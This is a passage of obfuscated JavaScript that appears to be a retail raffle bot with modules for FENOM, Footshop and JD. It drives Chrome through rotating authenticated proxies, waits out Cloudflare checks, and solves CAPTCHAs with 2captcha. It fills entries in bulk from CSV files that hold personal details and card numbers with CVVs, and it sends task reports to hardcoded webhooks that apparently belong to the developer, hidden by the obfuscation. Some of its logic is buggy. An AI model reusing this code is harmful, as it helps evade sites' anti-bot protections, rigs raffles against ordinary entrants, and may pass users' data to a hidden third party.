                            } catch (_0x22ab81) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x22ab81);
                            }
                        } catch (_0xe7aad8) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xf49c5d['name'] + ']\x20Task\x20' + (_0x699074 + 0x1) + '\x20:\x20' + _0xe7aad8)), _0x40c097 = '' + _0xe7aad8;
                            var _0x1ecc72 = await _0x52a86e(_0x424154[_0x699074], _0xf49c5d, 'acc', !![], _0x40c097);
                            _0x4e68d5['errorDEV'] = { 'embeds': [_0x1ecc72] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x4e68d5['errorDEV']), await _0x57bb0c(_0xb4796a, _0x4e68d5['errorDEV']), _0x3e1a36 = 'yes';
                        } finally {
                            _0x22b014['close']();
                            if (_0x3e1a36 == 'yes' && _0x49997f != 0x5 && _0x40c097 != 'Size\x20Not\x20Found') {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xf49c5d['name'] + ']\x20Task\x20' + (_0x699074 + 0x1) + '\x20:\x20Retrying')), _0x699074 = _0x699074 - 0x1, _0x49997f = _0x49997f + 0x1;
                                continue;
                            }
                            _0x3e1a36 == 'yes' && _0x49997f >= 0x5 && (_0x5c9ba1(_0x424154[_0x699074], _0xf49c5d), _0x3e1a36 = 'no', _0x49997f = 0x0), console['log'](_0x15866d() + '\x20[' + _0xf49c5d['name'] + ']\x20Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x399cca(_0x53a887, _0x3ff44a, _0x2f078b) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xd61fdf = 0x0; _0xd61fdf < _0x3ff44a['length']; _0xd61fdf++) {
                        if (_0x294a3f != 'yes')
                            var _0x294a3f = '', _0x3d3f7f = 0x0;
                        var _0x593098;
                        await _0x502cd4(_0x3ff44a, _0xd61fdf), _0x3d4687(_0x53a887['name'] + '\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20/\x20' + _0x3ff44a['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57);
                        const _0x4af9f5 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5e72ca = Math['round'](Math['random']() * (_0x2f078b['length'] - 0x1)), _0x51f29c = _0x2f078b[_0x5e72ca]['split'](':'), _0x4b9a65;
                        try {
                            _0x4b9a65 = await _0x3cc012['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x51f29c[0x0] + ':' + _0x51f29c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4b9a65 = await _0x3cc012['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x51f29c[0x0] + ':' + _0x51f29c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2ad368 = await _0x4b9a65['newPage'](), _0x332e6d = await _0x2ad368['target']()['createCDPSession'](), { windowId: _0x2879a9 } = await _0x332e6d['send']('Browser.getWindowForTarget');
                            await _0x2ad368['authenticate']({
                                'username': '' + _0x51f29c[0x2],
                                'password': '' + _0x51f29c[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2ad368['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x506d6f(0xbb8), await _0x332e6d['send']('Browser.setWindowBounds', {
                                'windowId': _0x2879a9,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x506d6f(0x1f40);
                            try {
                                await _0x2ad368['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x506d6f(0x1388), console['log'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20Logging\x20in'), await _0x2ad368['type']('input[name=\x22email\x22]', '' + _0x3ff44a[_0xd61fdf]['Email']), await _0x506d6f(0x1f4), await _0x2ad368['type']('input[name=\x22password\x22]', '' + _0x3ff44a[_0xd61fdf]['Password']), await _0x506d6f(0x258), await _0x2ad368['$eval']('#login-form', _0x3c84e6 => _0x3c84e6['submit']()), await _0x2ad368['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x506d6f(0x1f4), await _0x2ad368['goto']('' + _0x3ff44a[_0xd61fdf]['Url']), await _0x2ad368['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3ff44a[_0xd61fdf]['Size']);
                            if (_0x3ff44a[_0xd61fdf]['Size'] != 'RANDOM') {
                                var _0x54c7af = '\x20' + _0x3ff44a[_0xd61fdf]['Size'] + '\x20';
                                const _0x2f5d2a = await _0x2ad368['$x']('//span[contains(text(),\x20' + _0x54c7af + ')]');
                                await _0x2f5d2a[0x0]['click']();
                            } else {
                                const _0x2be0be = await _0x2ad368['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x179bf3 = Math['round'](Math['random']() * (_0x2be0be['length'] - 0x1));
                                await _0x2be0be[_0x179bf3]['click']();
                            }
                            await _0x506d6f(0x258), await _0x2ad368['click']('#cookieChoiceDismiss'), await _0x506d6f(0x3e8), await _0x2ad368['type']('#instagram-account', '' + _0x3ff44a[_0xd61fdf]['Follower']), await _0x506d6f(0x28a), await _0x2ad368['click']('#book-btn'), await _0x506d6f(0xbb8), await _0x2ad368['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x506d6f(0x1f4), console['log'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20' + _0x195a86['cyan']('Solving\x20Captcha')), await _0x2ad368['solveRecaptchas'](), console['log'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x506d6f(0x7d0), await _0x2ad368['$eval']('#book-btn-for-sure', _0x1c4791 => _0x1c4791['click']()), await _0x506d6f(0x12c), await _0x2ad368['click']('#book-btn-for-sure'), await _0x506d6f(0xdac);
                            const _0x1e04da = await _0x2ad368['$eval']('.reservation-popup\x20>\x20.title', _0x5bc04f => {
                                return _0x5bc04f['innerHTML'];
                            });
                            if (_0x1e04da) {
                                _0x294a3f = 'no', _0x37d376(_0x3ff44a[_0xd61fdf], _0x53a887), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x49a537 = await _0x52a86e(_0x3ff44a[_0xd61fdf], _0x53a887, 'dev', ![]), _0xd6aa7f = await _0x52a86e(_0x3ff44a[_0xd61fdf], _0x53a887, 'pub', ![]);
                                const _0xc47882 = {
                                    'succesDEVMSG': { 'embeds': [_0x49a537] },
                                    'succesPUBMSG': { 'embeds': [_0xd6aa7f] }
                                };
                                try {
                                    _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0xc47882['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0xc47882['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x3f4ede, _0xc47882['succesPUBMSG']);
                                } catch (_0x48acd3) {
                                    console['log'](_0x195a86['yellow'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x48acd3));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x42ecd7) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20' + _0x42ecd7)), _0x593098 = '' + _0x42ecd7;
                            var _0x50f850 = await _0x52a86e(_0x3ff44a[_0xd61fdf], _0x53a887, 'dev', !![], _0x593098), _0x49a537 = await _0x52a86e(_0x3ff44a[_0xd61fdf], _0x53a887, 'dev', ![]), _0xd6aa7f = await _0x52a86e(_0x3ff44a[_0xd61fdf], _0x53a887, 'pub', ![]);
                            const _0x1ccffd = {
                                'succesDEVMSG': { 'embeds': [_0x49a537] },
                                'succesPUBMSG': { 'embeds': [_0xd6aa7f] }
                            };
                            _0x1ccffd['errorDEV'] = { 'embeds': [_0x50f850] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x1ccffd['errorDEV']), await _0x57bb0c(_0xb4796a, _0x1ccffd['errorDEV']), _0x42ecd7 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x294a3f = 'yes');
                        } finally {
                            _0x4b9a65['close']();
                            if (_0x294a3f == 'yes' && _0x3d3f7f != 0x5 && _0x593098 != 'Size\x20Not\x20Found') {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Task\x20' + (_0xd61fdf + 0x1) + '\x20:\x20Retrying')), _0xd61fdf = _0xd61fdf - 0x1, _0x3d3f7f = _0x3d3f7f + 0x1;
                                continue;
                            }
                            _0x294a3f == 'yes' && _0x3d3f7f >= 0x5 && (_0x5c9ba1(_0x3ff44a[_0xd61fdf], _0x53a887), _0x294a3f = 'no', _0x3d3f7f = 0x0), console['log'](_0x15866d() + '\x20[' + _0x53a887['name'] + ']\x20Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x2acfa5, _0xe57f35, _0x44b211) {
                _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5f2d88['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x429963 = 0x0; _0x429963 < _0xe57f35['length']; _0x429963++) {
                    var _0x408733;
                    if (_0x58868d != 'yes')
                        var _0x58868d = '', _0x5dbc20 = 0x0;
                    var _0x4f225a = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x3ab3dd
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0xe57f35[_0x429963]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xe57f35[_0x429963]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5f2d88['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0xca8e52
                            }
                        ]
                    }], _0x291a27 = await _0x52a86e(_0xe57f35[_0x429963], _0x2acfa5, 'dev', ![]), _0x191d2a = await _0x52a86e(_0xe57f35[_0x429963], _0x2acfa5, 'pub', ![]);
                    const _0x2a84cc = {
                        'succesDEVMSG': { 'embeds': [_0x291a27] },
                        'succesPUBMSG': { 'embeds': [_0x191d2a] }
                    }, _0x2290bd = { 'embeds': _0x4f225a };
                    await _0x502cd4(_0xe57f35, _0x429963);
                    if (_0xe57f35[_0x429963]['Email'] == '' || _0xe57f35[_0x429963]['FirstName'] == '' || _0xe57f35[_0x429963]['LastName'] == '' || _0xe57f35[_0x429963]['Country'] == '' || _0xe57f35[_0x429963]['Size'] == '' || _0xe57f35[_0x429963]['Address1'] == '' || _0xe57f35[_0x429963]['Zip'] == '') {
                        console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0xe57f35[_0x429963]['Email'] == '' || _0xe57f35[_0x429963]['FirstName'] == '' || _0xe57f35[_0x429963]['LastName'] == '' || _0xe57f35[_0x429963]['Country'] == '' || _0xe57f35[_0x429963]['Size'] == '' || _0xe57f35[_0x429963]['Address1'] == '' || _0xe57f35[_0x429963]['Zip'] == '' || _0xe57f35[_0x429963]['Phone'] == '') {
                        console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0xe3bb2d = '' + _0xe57f35[_0x429963]['Url'];
                    if (_0x5f2d88['useRandomProxy'] = ![])
                        var _0x24e75a = _0x44b211[_0x429963]['split'](':');
                    else
                        var _0x15efa9 = Math['round'](Math['random']() * (_0x44b211['length'] - 0x1)), _0x24e75a = _0x44b211[_0x15efa9]['split'](':');
                    const _0x16f52c = await _0x3cc012['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x24e75a[0x0] + ':' + _0x24e75a[0x1]]
                    });
                    try {
                        const _0x2749ef = await _0x16f52c['newPage']();
                        await _0x2749ef['authenticate']({
                            'username': '' + _0x24e75a[0x2],
                            'password': '' + _0x24e75a[0x3]
                        }), console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2749ef['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2749ef['setRequestInterception'](!![]), _0x2749ef['on']('request', _0x39a8c3 => {
                            _0x39a8c3['resourceType']() === 'image' || _0x39a8c3['resourceType']() === 'font' || _0x39a8c3['resourceType']() === 'media' ? _0x39a8c3['abort']() : _0x39a8c3['continue']();
                        }), await _0x2749ef['goto'](_0xe3bb2d), await _0x506d6f(0xbb8), await _0x2749ef['waitForSelector']('.control__JhutY'), await _0x2749ef['click']('.control__JhutY'), await _0x506d6f(0x1f4);
                        if (_0xe57f35[_0x429963]['Size'] != 'RANDOM')
                            try {
                                const _0x10469e = await _0x2749ef['$x']('//div[contains(text(),\x20\x27' + _0xe57f35[_0x429963]['Size'] + '\x27)]');
                                await _0x10469e[0x0]['click']();
                            } catch {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x5d4c3f = await _0x2749ef['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0xa5e269 = Math['round'](Math['random']() * (_0x5d4c3f['length'] - 0x1));
                            await _0x5d4c3f[_0xa5e269]['click']();
                        }
                        await _0x506d6f(0x4b0);
                        const _0x3af8ab = await _0x2749ef['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x3af8ab[0x0]['click'](), await _0x2749ef['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x2749ef['type']('input[name=\x22email\x22]', '' + _0xe57f35[_0x429963]['Email']), await _0x506d6f(0x640), await _0x2749ef['type']('input[name=\x22phone\x22]', '' + _0xe57f35[_0x429963]['Phone']), await _0x506d6f(0x4b0), await _0x2749ef['click']('button.btn.continue-button__1RtsS'), await _0x506d6f(0x4b0);
                        try {
                            await _0x2749ef['type']('input[name=\x22firstName\x22]', '' + _0xe57f35[_0x429963]['FirstName']), await _0x506d6f(0x258);
                        } catch {
                            const _0x44c815 = await _0x2749ef['$$eval']('.invalid-feedback\x20>\x20div', _0x320645 => {
                                return _0x320645['map'](_0x5315dd => _0x5315dd['innerText']);
                            });
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20' + _0x44c815));
                            continue;
                        }
                        await _0x2749ef['type']('input[name=\x22lastName\x22]', '' + _0xe57f35[_0x429963]['LastName']), await _0x506d6f(0xc8), await _0x2749ef['type']('input[name=\x22instagramUsername\x22]', '' + _0xe57f35[_0x429963]['Follower']), await _0x506d6f(0x4b0), await _0x2749ef['click']('button.btn.continue-button__1RtsS'), await _0x506d6f(0x3e8), console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x2749ef['select']('select[name=\x22country\x22]', '' + _0xe57f35[_0x429963]['Country']), await _0x506d6f(0x2bc), await _0x2749ef['type']('input[name=\x22streetName\x22]', '' + _0xe57f35[_0x429963]['Address1']), await _0x506d6f(0x258), await _0x2749ef['type']('input[name=\x22houseNumber\x22]', _0xe57f35[_0x429963]['HouseNumber'] + '\x20' + _0xe57f35[_0x429963]['Address2']), await _0x506d6f(0xc8), await _0x2749ef['type']('input[name=\x22postalCode\x22]', '' + _0xe57f35[_0x429963]['Zip']), await _0x506d6f(0x1f4), await _0x2749ef['type']('input[name=\x22city\x22]', '' + _0xe57f35[_0x429963]['City']), await _0x506d6f(0x4b0), await _0x2749ef['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x506d6f(0x4b0), await _0x2749ef['click']('button.btn.continue-button__1RtsS'), await _0x506d6f(0x4b0), console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x2749ef['solveRecaptchas'](), console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x506d6f(0xbb8), await _0x2749ef['click']('button.btn.continue-button__1RtsS'), await _0x506d6f(0x1388), console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x2749ef['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2749ef['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x506d6f(0x4b0), await _0x2749ef['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0xe57f35[_0x429963]['CardNumber']), await _0x506d6f(0x320), await _0x2749ef['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2749ef['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0xe57f35[_0x429963]['ExpiryDate']), await _0x506d6f(0x4b0), await _0x2749ef['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2749ef['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0xe57f35[_0x429963]['CVV']), await _0x506d6f(0x226), await _0x2749ef['type']('input[name=\x22holderName\x22]', '' + _0xe57f35[_0x429963]['NameOnCard']), await _0x506d6f(0x226), await _0x2749ef['click']('button.adyen-checkout__button'), console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x2749ef['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x506d6f(0xbb8);
                        } catch (_0x4e138c) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x203DS\x20Failed')), _0x408733 = '3DS\x20Error\x20' + _0x4e138c;
                            var _0x49a4bf = await _0x52a86e(_0xe57f35[_0x429963], _0x2acfa5, 'dev', !![], _0x408733);
                            _0x2a84cc['errorDEV'] = { 'embeds': [_0x49a4bf] };
                            _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x2a84cc['errorDEV']);
                            await _0x57bb0c(_0xb4796a, _0x2a84cc['errorDEV']);
                            continue;
                        }
                        _0x37d376(_0xe57f35[_0x429963], _0x2acfa5), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                            try {
                                await _0x57bb0c(_0x5f2d88['webhook'], _0x2a84cc['succesDEVMSG']);
                            } catch {
                            }
                        await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x2a84cc['succesDEVMSG']), await _0x506d6f(0xc8);
                        try {
                            await _0x57bb0c(_0x3f4ede, _0x2a84cc['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0xd3b7e0) {
                        console['log'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20' + _0xd3b7e0), _0x408733 = '' + _0xd3b7e0;
                        var _0x49a4bf = await _0x52a86e(_0xe57f35[_0x429963], _0x2acfa5, 'dev', !![], _0x408733);
                        _0x2a84cc['errorDEV'] = { 'embeds': [_0x49a4bf] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x2a84cc['errorDEV']), await _0x57bb0c(_0xb4796a, _0x2a84cc['errorDEV']), _0x58868d = 'yes';
                    } finally {
                        _0x16f52c['close']();
                        if (_0x58868d == 'yes' && _0x5dbc20 != 0x5) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x2acfa5['name'] + ']\x20Task\x20' + (_0x429963 + 0x1) + '\x20:\x20Retrying')), _0x429963 = _0x429963 - 0x1, _0x5dbc20 = _0x5dbc20 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5f2d88['footshopDelay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x37373d, _0x5e3d0c, _0x52d1f2) {
                var _0x522666 = ![], _0x2e5373 = ![];
                if (_0x5f2d88['captchaKey'] == '' || _0x5f2d88['captchaKey'] == undefined)
                    return console['log'](_0x195a86['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5f2d88['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x372d46 = 0x0; _0x372d46 < _0x5e3d0c['length']; _0x372d46++) {
                    if (_0x12c259 != 'yes')
                        var _0x12c259 = '', _0x1646b8 = 0x0;
                    var _0x6b7f72, _0x2ec74e = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x5e3d0c[_0x372d46]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5e3d0c[_0x372d46]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x3ab3dd
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5f2d88['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0xca8e52
                            }
                        ]
                    }];
                    const _0x17cd07 = { 'embeds': _0x2ec74e };
                    _0x3d4687(_0x37373d['name'] + '\x20Task\x20' + (_0x372d46 + 0x1) + '\x20/\x20' + _0x5e3d0c['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x5e3d0c, _0x372d46);
                    var _0x4cb45a = await _0x52a86e(_0x5e3d0c[_0x372d46], _0x37373d, 'dev', ![]), _0x4f847a = await _0x52a86e(_0x5e3d0c[_0x372d46], _0x37373d, 'pub', ![]);
                    const _0x442128 = {
                        'succesDEVMSG': { 'embeds': [_0x4cb45a] },
                        'succesPUBMSG': { 'embeds': [_0x4f847a] }
                    };
                    if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                        try {
                            await _0x57bb0c(_0x5f2d88['webhook'], _0x442128['succesDEVMSG']);
                        } catch {
                        }
                    await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x442128['succesDEVMSG']), await _0x506d6f(0xc8);
                    try {
                        await _0x57bb0c(_0x3f4ede, _0x442128['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x5e3d0c[_0x372d46]['Email'] == '' || _0x5e3d0c[_0x372d46]['Url'] == '' || _0x5e3d0c[_0x372d46]['FirstName'] == '' || _0x5e3d0c[_0x372d46]['LastName'] == '') {
                        console['log'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5f2d88['useRandomProxy'] = ![])
                        var _0x5b7016 = _0x52d1f2[_0x372d46]['split'](':');
                    else
                        var _0x51e8a4 = Math['round'](Math['random']() * (_0x52d1f2['length'] - 0x1)), _0x5b7016 = _0x52d1f2[_0x51e8a4]['split'](':');
                    const _0xb2e7c4 = await _0x3cc012['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x5b7016[0x0] + ':' + _0x5b7016[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x3a577c = await _0xb2e7c4['newPage']();
                        await _0x3a577c['authenticate']({
                            'username': '' + _0x5b7016[0x2],
                            'password': '' + _0x5b7016[0x3]
                        }), console['log'](_0x15866d() + '\x20[' + _0x37373d['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a577c['setRequestInterception'](!![]), _0x3a577c['on']('request', _0x15e197 => {
                            _0x15e197['resourceType']() === 'image' || _0x15e197['resourceType']() === 'font' || _0x15e197['resourceType']() === 'media' ? _0x15e197['abort']() : _0x15e197['continue']();
                        }), await _0x3a577c['goto']('' + _0x5e3d0c[_0x372d46]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x3a577c['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x15866d() + '\x20[' + _0x37373d['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3a577c['type']('#comp_firstname', '' + _0x5e3d0c[_0x372d46]['FirstName']), await _0x3a577c['waitForSelector']('#comp_lastname'), await _0x3a577c['type']('#comp_lastname', '' + _0x5e3d0c[_0x372d46]['LastName']), await _0x3a577c['waitForSelector']('#comp_email'), await _0x3a577c['type']('#comp_email', '' + _0x5e3d0c[_0x372d46]['Email']), await _0x3a577c['waitForSelector']('#comp_paypalemail'), await _0x3a577c['type']('#comp_paypalemail', '' + _0x5e3d0c[_0x372d46]['Email']), await _0x3a577c['waitForSelector']('#comp_mobile_end'), await _0x3a577c['type']('#comp_mobile_end', '' + _0x5e3d0c[_0x372d46]['Phone']), await _0x3a577c['waitForSelector']('#comp_dob'), await _0x3a577c['type']('#comp_dob', '08/09/1992'), console['log'](_0x15866d() + '\x20[' + _0x37373d['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x5e3d0c[_0x372d46]['Size'] == 'RANDOM') {
                            const _0x39d0ae = await _0x3a577c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x269d94 => {
                                return _0x269d94['map'](_0xaed673 => _0xaed673['value']);
                            });
                            var _0x23f359 = Math['round'](Math['random']() * (_0x39d0ae['length'] - 0x2));
                            await _0x3a577c['select']('#shoesize', _0x39d0ae[_0x23f359 + 0x1]), await _0x506d6f(0x3e8);
                        } else {
                            const _0x28252f = await _0x3a577c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3ce628 => {
                                return _0x3ce628['map'](_0x413a97 => _0x413a97['innerText']);
